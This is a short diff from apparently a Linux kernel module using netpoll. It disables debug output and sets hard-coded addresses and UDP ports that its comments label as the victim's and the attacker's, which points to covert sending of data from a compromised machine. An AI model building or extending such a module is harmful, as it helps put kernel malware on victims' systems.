@@ -19,11 +19,11 @@
 #include <linux/if_ether.h>
 #include <linux/netpoll.h>
 
-#define DEBUG 1
+#define DEBUG 0
 #define debug(args...) if(DEBUG) printk(KERN_INFO args)
 
-#define SRC_IP "0.0.0.0" // the victim's IP address, not important
-#define DEST_IP "10.0.2.15" // the attacker's IP address
+#define SRC_IP "192.168.0.111" // the victim's IP address, not important
+#define DEST_IP "192.168.1.37" // the attacker's IP address
 #define SRC_PORT 12345 // the victim's UDP port
 #define DEST_PORT 54321 // the attacker's UDP port
 
